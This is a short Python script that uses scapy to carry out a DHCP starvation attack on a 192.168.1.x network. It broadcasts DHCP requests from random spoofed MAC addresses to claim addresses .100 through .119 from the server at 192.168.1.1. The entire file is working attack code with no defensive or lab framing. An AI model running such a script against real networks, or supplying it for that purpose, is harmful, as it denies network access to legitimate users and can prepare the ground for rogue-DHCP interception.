#!/usr/bin/env python

import sys
import os
from scapy.all import *

def main():
    layer2_broadcast = "ff:ff:ff:ff:ff:ff"
    conf.checkIPaddr = False #To stop scapy from checking return packet originating from any packet that we have sent out
    
    IP_address_subnet = "192.168.1."
    
    def dhcp_starvation():
        for ip in range (100,120):
            for i in range (0,1):
                bogus_mac_address = RandMAC()
                dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),("server_id","192.168.1.1"),("requested_addr", IP_address_subnet + str(ip)),"end"])
                sendp(dhcp_request)
                print("Requesting: " + IP_address_subnet + str(ip) + "\n")
                time.sleep(1)
                
    dhcp_starvation()
            
if __name__=="__main__":
    main()
                
        